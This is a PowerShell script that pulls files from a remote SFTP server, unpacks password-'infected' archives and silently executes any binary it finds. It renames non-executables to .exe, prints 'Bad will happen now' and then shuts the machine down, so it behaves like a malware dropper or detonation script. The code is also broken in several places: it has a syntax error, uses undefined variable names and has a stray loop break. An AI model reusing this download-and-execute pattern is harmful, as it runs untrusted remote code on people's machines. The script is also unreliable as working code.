function Receive-FTP([string]$user, [string]$pass, [string]$site, [string]$key, [string]$source, [string]$dest){
    try
    {

        # Setup session options
        $sessionOptions = New-Object WinSCP.SessionOptions
        $sessionOptions.Protocol = [WinSCP.Protocol]::Sftp
        $sessionOptions.HostName = "$site"
        $sessionOptions.UserName = "$user"
        $sessionOptions.Password = "$pass"
        $sessionOptions.SshHostKeyFingerprint = "$key"

        $session = New-Object WinSCP.Session

        try
        {
            # Connect
            $session.Open($sessionOptions)

            #List Dir
            $listDir = $session.ListDirectory($ftpSource)

            foreach ($file in $listDir.Files.) {

                $transferResult = $session.GetFiles($ftpSource, $ftpDest).Check()
            }

            # Print results
            foreach ($transfer in $transferResult.Transfers)
                {
                    Write-Host  -foregroundcolor green ("Upload of {0} succeeded" -f $transfer.FileName)
                            if ([System.IO.Path]::GetExtension("$transfer") -ieq ".zip")
                            {
                                sz x "$transfer" -o"C:\Users\John Doe\Downloads\runbaby\" -p "infected"
                                Remove-Item $transfer.Fullname
                            }
                    break
                }
        }
            finally
            {
                # Disconnect, clean up
                $session.Dispose()
            }

            #exit 0
    }
        catch [Exception]
        {
            Write-Host $_.Exception.Message
            exit 1
        }
      $danger = get-childitem -Filter *  "C:\Users\John Doe\Downloads\runbaby\*";
      if ([System.IO.Path]::GetExtension("$danger") -ieq ".exe")
        {
           Start-Process $danger.Fullname -ArgumentList "/s"
           Write-Host "Bad will happen now"
           Start-Sleep -Seconds 600
           Stop-Computer -ComputerName localhost
        }
      else{
          Rename-Item $danger.Fullname -newName "$file.exe"
          Start-Process $danger.Fullname -ArgumentList "/s"
          Start-Sleep -Seconds 600
          Stop-Computer -ComputerName localhost
      }


}